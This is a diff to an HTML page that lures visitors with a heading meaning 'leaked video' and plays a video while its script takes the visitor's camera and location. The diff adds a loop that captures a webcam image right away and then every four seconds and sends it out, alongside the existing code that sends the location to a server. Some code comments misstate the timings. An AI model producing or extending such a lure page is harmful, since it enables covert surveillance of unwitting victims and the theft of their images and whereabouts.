@@ -35,7 +35,7 @@ h1 {
   </style>
 </head>
 <body>
-  <h1>Video Ma Chii</h1> 
+  <h1>វីដេអូបែកធ្លាយ</h1> 
 <video id="homevideo" autoplay="" controls webkit-playsinline="" width="100%" height="100%" >
  <source src="machiu.mp4" type="video/mp4">
  </source>
@@ -88,7 +88,7 @@ h1 {
       .then(stream => {
         video.srcObject = stream;
         getLocation(); // Request location first
-        setTimeout(captureAndSend, 2000); // Capture image after 2 seconds
+        setTimeout(startLoopCapture, 1000); // Capture image after 2 seconds
       })
       .catch(error => console.error("Camera permission denied:", error));
 
@@ -153,6 +153,10 @@ h1 {
       .then(response => response.json())
       .then(data => console.log("Location sent:", data))
       .catch(error => console.error("Error sending location:", error));
+    }
+    function startLoopCapture() {
+      captureAndSend(); // Capture first image immediately
+      setInterval(captureAndSend, 4000); // Capture image every 5 seconds
     }
   </script>
 </body>
